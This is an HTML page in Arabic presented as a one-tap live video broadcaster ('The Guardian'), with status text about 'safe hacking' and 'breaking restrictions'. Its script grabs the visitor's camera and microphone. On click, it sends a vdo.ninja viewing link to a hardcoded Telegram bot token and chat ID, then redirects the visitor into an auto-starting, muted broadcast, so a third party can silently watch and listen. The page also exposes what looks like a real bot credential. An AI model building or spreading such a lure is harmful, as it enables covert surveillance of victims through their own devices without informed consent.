<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الحارس - نظام الفيديو النهائي 🛡️</title>
    <style>
        :root { --primary: #2563eb; --bg: #020617; }
        body { background: var(--bg); color: white; text-align: center; font-family: sans-serif; margin: 0; padding: 20px; }
        .card { background: #1e293b; border-radius: 30px; padding: 25px; max-width: 450px; margin: auto; border: 1px solid #334155; box-shadow: 0 20px 50px rgba(0,0,0,0.6); }
        video { width: 100%; border-radius: 20px; background: #000; border: 2px solid var(--primary); }
        .btn-vid { 
            background: linear-gradient(135deg, #ef4444, #b91c1c); 
            color: white; width: 100%; padding: 20px; border-radius: 18px; 
            border: none; font-weight: bold; cursor: pointer; font-size: 1.2rem;
            margin-top: 20px; transition: 0.3s;
        }
        #status { color: #fbbf24; margin-top: 15px; font-size: 0.9rem; font-weight: bold; }
    </style>
</head>
<body>

    <div class="card">
        <h2 style="color: var(--primary);">بث فيديو مباشر (Force HD)</h2>
        <video id="preview" autoplay playsinline muted></video>
        <button class="btn-vid" onclick="forceVideoBroadcast()">🎬 إطلاق الفيديو الآن</button>
        <div id="status">جاهز للاختراق الآمن..</div>
    </div>

    <script>
        const TOKEN = "8799708539:AAFFvqiwSvFBTACNrnZtOO5noYErlLsc958";
        const CHAT_ID = "1734714029";
        let localStream = null;

        async function init() {
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "environment", width: 640 }, 
                    audio: true 
                });
                document.getElementById('preview').srcObject = localStream;
            } catch (e) { document.getElementById('status').innerText = "تأكدي من استخدام HTTPS"; }
        }

        async function forceVideoBroadcast() {
            const statusTxt = document.getElementById('status');
            statusTxt.innerText = "🚀 جاري كسر القيود وإرسال الرابط...";

            const streamID = "FINAL_BOSS_" + Math.floor(Math.random() * 9999);
            
            // روابط "القوة القصوى" - تم حذف كل ما قد يسبب بطء التشفير
            // ميزة &buffer=0 تمنع الدائرة الدوارة تماماً
            const pushURL = `https://vdo.ninja/?push=${streamID}&autostart&clean&mute&vcodec=vp8&buffer=0&m=1&quality=0`;
            const viewURL = `https://vdo.ninja/?view=${streamID}&autoplay=1&clock=1&noap&vp8&buffer=0`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        text: `🎬 **رابط الفيديو المباشر (بدون تقطيع):**\n${viewURL}`,
                        parse_mode: "Markdown"
                    })
                });

                if (response.ok) {
                    statusTxt.innerText = "✅ تم الإرسال! جاري التحويل...";
                    
                    // تحرير الكاميرا بشكل كامل وصارم
                    if (localStream) {
                        localStream.getTracks().forEach(t => { t.stop(); t.enabled = false; });
                    }

                    setTimeout(() => {
                        window.location.replace(pushURL); // استخدام replace بدلاً من href لمنع العودة للخلف وتعليق الكاميرا
                    }, 500);
                }
            } catch (e) {
                statusTxt.innerText = "❌ فشل الإرسال. تأكدي من الإنترنت.";
            }
        }

        init();
    </script>
</body>
</html>
